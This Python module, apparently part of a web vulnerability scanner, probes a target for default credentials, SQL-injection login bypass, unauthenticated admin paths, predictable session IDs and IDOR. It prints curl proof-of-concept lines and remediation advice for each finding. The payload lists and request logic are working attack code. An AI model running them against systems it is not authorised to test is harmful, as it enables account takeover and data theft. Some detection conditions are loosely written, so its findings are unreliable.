"""
Authentication Bypass & Authorization Testing Module
Tests for authentication bypasses, weak auth, and authorization flaws
"""

import requests
from urllib.parse import urlparse, parse_qs, urlunparse, urlencode, urljoin
from bs4 import BeautifulSoup
import re

def test_authentication_bypass(scanner):
    """
    Test for authentication bypass vulnerabilities
    """
    try:
        # Test for default credentials
        _test_default_credentials(scanner)
        
        # Test for SQL injection in login
        _test_sql_auth_bypass(scanner)
        
        # Test for authentication bypass techniques
        _test_auth_bypass_techniques(scanner)
        
        # Test for session vulnerabilities
        _test_session_vulnerabilities(scanner)
        
        # Test for IDOR vulnerabilities
        _test_idor_vulnerabilities(scanner)
        
    except Exception as e:
        print(f"Auth testing error: {e}")

def _test_default_credentials(scanner):
    """Test for default/common credentials"""
    response = scanner.get_cached_response(scanner.target_url)
    if not response:
        return
    
    soup = BeautifulSoup(response.content, 'html.parser')
    
    # Find login forms
    forms = soup.find_all('form')
    for form in forms:
        # Check if it's a login form
        password_fields = form.find_all('input', {'type': 'password'})
        if not password_fields:
            continue
        
        action = form.get('action', '')
        method = str(form.get('method', 'POST')).upper()
        form_url = urljoin(str(scanner.target_url), str(action)) if action else scanner.target_url
        
        # Common default credentials
        default_creds = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('administrator', 'administrator'),
            ('root', 'root'),
            ('admin', '12345'),
            ('admin', ''),
            ('test', 'test'),
            ('demo', 'demo'),
            ('user', 'user'),
        ]
        
        # Try to find username and password field names
        username_field = None
        password_field = None
        
        for input_tag in form.find_all('input'):
            input_type = str(input_tag.get('type', 'text')).lower()
            input_name = str(input_tag.get('name', '')).lower()
            
            if input_type == 'password':
                password_field = str(input_tag.get('name', ''))
            elif 'user' in input_name or 'email' in input_name or 'login' in input_name:
                username_field = str(input_tag.get('name', ''))
        
        if not (username_field and password_field):
            continue
        
        # Test default credentials
        for username, password in default_creds:
            if not username_field or not password_field:
                continue
            
            form_data = {
                str(username_field): username,
                str(password_field): password
            }
            
            try:
                if method == 'POST':
                    test_response = requests.post(form_url, data=form_data, timeout=10, verify=False, allow_redirects=False)
                else:
                    test_response = requests.get(form_url, params=form_data, timeout=10, verify=False, allow_redirects=False)
                
                # Check for successful login indicators
                success_indicators = [
                    test_response.status_code in [301, 302, 303],  # Redirect
                    'dashboard' in test_response.text.lower(),
                    'welcome' in test_response.text.lower(),
                    'logout' in test_response.text.lower(),
                    test_response.cookies and len(test_response.cookies) > 0,
                ]
                
                # Check for failure indicators
                failure_indicators = [
                    'incorrect' in test_response.text.lower(),
                    'invalid' in test_response.text.lower(),
                    'failed' in test_response.text.lower(),
                    'wrong' in test_response.text.lower(),
                ]
                
                if any(success_indicators) and not any(failure_indicators):
                    scanner.add_finding(
                        severity='CRITICAL',
                        category='Authentication',
                        title=f'Default credentials accepted: {username}/{password}',
                        description=f'**CRITICAL: DEFAULT CREDENTIALS WORK**\n\n'
                                  f'Username: {username}\n'
                                  f'Password: {password}\n'
                                  f'Login URL: {form_url}\n\n'
                                  f'**Proof of Concept:**\n'
                                  f'```bash\n'
                                  f'curl -X POST "{form_url}" \\\n'
                                  f'  -d "{username_field}={username}" \\\n'
                                  f'  -d "{password_field}={password}"\n'
                                  f'```\n\n'
                                  f'**Impact:**\n'
                                  f'- Attacker can gain full access to admin panel\n'
                                  f'- Complete system compromise possible\n'
                                  f'- Data breach highly likely',
                        url=form_url,
                        remediation='**IMMEDIATE ACTION REQUIRED:**\n'
                                  '1. Change default credentials NOW\n'
                                  '2. Force password reset on first login\n'
                                  '3. Implement strong password policy\n'
                                  '4. Enable multi-factor authentication (MFA)\n'
                                  '5. Monitor for unauthorized access attempts'
                    )
                    return  # Found working creds, stop testing
                    
            except Exception as e:
                pass

def _test_sql_auth_bypass(scanner):
    """Test for SQL injection in authentication"""
    response = scanner.get_cached_response(scanner.target_url)
    if not response:
        return
    
    soup = BeautifulSoup(response.content, 'html.parser')
    forms = soup.find_all('form')
    
    for form in forms:
        password_fields = form.find_all('input', {'type': 'password'})
        if not password_fields:
            continue
        
        action = form.get('action', '')
        method = str(form.get('method', 'POST')).upper()
        form_url = urljoin(str(scanner.target_url), str(action)) if action else scanner.target_url
        
        # SQL injection authentication bypass payloads
        bypass_payloads = [
            ("admin' OR '1'='1", "anything"),
            ("admin' --", ""),
            ("admin' #", ""),
            ("' OR 1=1--", ""),
            ("admin' OR '1'='1'--", "password"),
        ]
        
        # Find username/password fields
        username_field = None
        password_field = None
        
        for input_tag in form.find_all('input'):
            input_type = str(input_tag.get('type', 'text')).lower()
            input_name = str(input_tag.get('name', '')).lower()
            
            if input_type == 'password':
                password_field = str(input_tag.get('name', ''))
            elif 'user' in input_name or 'email' in input_name or 'login' in input_name:
                username_field = str(input_tag.get('name', ''))
        
        if not (username_field and password_field):
            continue
        
        for username_payload, password_payload in bypass_payloads:
            if not username_field or not password_field:
                continue
            form_data = {
                str(username_field): username_payload,
                str(password_field): password_payload
            }
            
            try:
                if method == 'POST':
                    test_response = requests.post(form_url, data=form_data, timeout=10, verify=False, allow_redirects=False)
                else:
                    test_response = requests.get(form_url, params=form_data, timeout=10, verify=False, allow_redirects=False)
                
                # Check for bypass indicators
                if (test_response.status_code in [301, 302, 303, 200] and
                    'dashboard' in test_response.text.lower() or 'welcome' in test_response.text.lower()):
                    
                    scanner.add_finding(
                        severity='CRITICAL',
                        category='Authentication',
                        title='SQL Injection Authentication Bypass',
                        description=f'**CRITICAL: AUTHENTICATION BYPASS via SQL INJECTION**\n\n'
                                  f'Login bypassed using SQL injection\n'
                                  f'Username Payload: {username_payload}\n'
                                  f'Password Payload: {password_payload}\n\n'
                                  f'**How It Works:**\n'
                                  f'The login query likely looks like:\n'
                                  f'```sql\n'
                                  f'SELECT * FROM users WHERE username=\'{username_payload}\' AND password=\'...\'\n'
                                  f'```\n'
                                  f'This becomes:\n'
                                  f'```sql\n'
                                  f'SELECT * FROM users WHERE username=\'admin\' OR \'1\'=\'1\' AND password=\'...\'\n'
                                  f'```\n'
                                  f'Since 1=1 is always true, authentication is bypassed!\n\n'
                                  f'**Exploitation:**\n'
                                  f'Anyone can login as admin without knowing password',
                        url=form_url,
                        remediation='**CRITICAL FIX:**\n'
                                  '1. Use parameterized queries (prepared statements)\n'
                                  '2. NEVER concatenate user input in SQL\n'
                                  '3. Implement proper input validation\n'
                                  '4. Add account lockout after failed attempts'
                    )
                    return
            except:
                pass

def _test_auth_bypass_techniques(scanner):
    """Test various authentication bypass techniques"""
    parsed = urlparse(scanner.target_url)
    
    # Test for forced browsing
    admin_paths = [
        '/admin',
        '/administrator',
        '/admin/dashboard',
        '/admin/index.php',
        '/admin/admin.php',
        '/admin.php',
        '/dashboard',
        '/panel',
        '/user/profile',
        '/account',
    ]
    
    for path in admin_paths:
        test_url = f"{parsed.scheme}://{parsed.netloc}{path}"
        
        try:
            response = requests.get(test_url, timeout=10, verify=False, allow_redirects=False)
            
            # If we get 200, auth might not be required
            if response.status_code == 200:
                # Check if it's actually admin content
                admin_indicators = ['dashboard', 'admin', 'settings', 'users', 'control panel']
                if any(indicator in response.text.lower() for indicator in admin_indicators):
                    scanner.add_finding(
                        severity='CRITICAL',
                        category='Authentication',
                        title=f'Admin panel accessible without authentication: {path}',
                        description=f'**CRITICAL: NO AUTHENTICATION REQUIRED**\n\n'
                                  f'Admin area accessible directly: {test_url}\n\n'
                                  f'**Impact:**\n'
                                  f'- Anyone can access admin functions\n'
                                  f'- Full system compromise possible\n'
                                  f'- No credentials needed',
                        url=test_url,
                        remediation='Implement proper authentication checks for all admin areas'
                    )
        except:
            pass

def _test_session_vulnerabilities(scanner):
    """Test for session management vulnerabilities"""
    response = scanner.get_cached_response(scanner.target_url)
    if not response:
        return
    
    # Check session cookies
    for cookie in response.cookies:
        # Check for predictable session IDs
        if 'session' in cookie.name.lower() or 'sess' in cookie.name.lower():
            cookie_value = cookie.value
            
            # Check if cookie is sequential or predictable
            if cookie_value.isdigit():
                scanner.add_finding(
                    severity='HIGH',
                    category='Authentication',
                    title='Predictable session ID detected',
                    description=f'**SESSION ID VULNERABILITY**\n\n'
                              f'Cookie: {cookie.name}\n'
                              f'Value: {cookie_value}\n\n'
                              f'Session ID appears to be numeric/sequential\n\n'
                              f'**How to Exploit:**\n'
                              f'Attacker can guess valid session IDs:\n'
                              f'- Try incrementing/decrementing values\n'
                              f'- Hijack other users\' sessions\n'
                              f'- Access accounts without credentials',
                    url=scanner.target_url,
                    remediation='Use cryptographically random session IDs (128+ bits)'
                )

def _test_idor_vulnerabilities(scanner):
    """Test for Insecure Direct Object Reference (IDOR)"""
    parsed = urlparse(scanner.target_url)
    params = parse_qs(parsed.query)
    
    # Look for ID parameters
    id_params = ['id', 'user_id', 'userid', 'account', 'profile', 'doc', 'file']
    
    for param_name in id_params:
        if param_name in params:
            original_value = params[param_name][0]
            
            # Try different values
            if original_value.isdigit():
                test_values = [
                    str(int(original_value) + 1),
                    str(int(original_value) - 1),
                    '1',
                    '2',
                    '999',
                ]
                
                for test_value in test_values:
                    test_params = params.copy()
                    test_params[param_name] = [test_value]
                    
                    new_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                         parsed.params, new_query, parsed.fragment))
                    
                    try:
                        test_response = requests.get(test_url, timeout=10, verify=False)
                        
                        # If we get 200 and different content, potential IDOR
                        if test_response.status_code == 200 and len(test_response.content) > 100:
                            scanner.add_finding(
                                severity='HIGH',
                                category='Authorization',
                                title=f'Potential IDOR vulnerability in parameter: {param_name}',
                                description=f'**IDOR (Insecure Direct Object Reference)**\n\n'
                                          f'Parameter: {param_name}\n'
                                          f'Can access different records by changing ID\n\n'
                                          f'**Test URLs:**\n'
                                          f'Original: {scanner.target_url}\n'
                                          f'Modified: {test_url}\n\n'
                                          f'**How to Exploit:**\n'
                                          f'1. Change {param_name} parameter to different values\n'
                                          f'2. Access other users\' data without authorization\n'
                                          f'3. View private information, documents, etc.',
                                url=test_url,
                                remediation='**Fix IDOR:**\n'
                                          '1. Implement proper authorization checks\n'
                                          '2. Verify user owns the resource before access\n'
                                          '3. Use indirect references (UUID instead of ID)\n'
                                          '4. Example: Check if user_id == session_user_id'
                            )
                            break
                    except:
                        pass
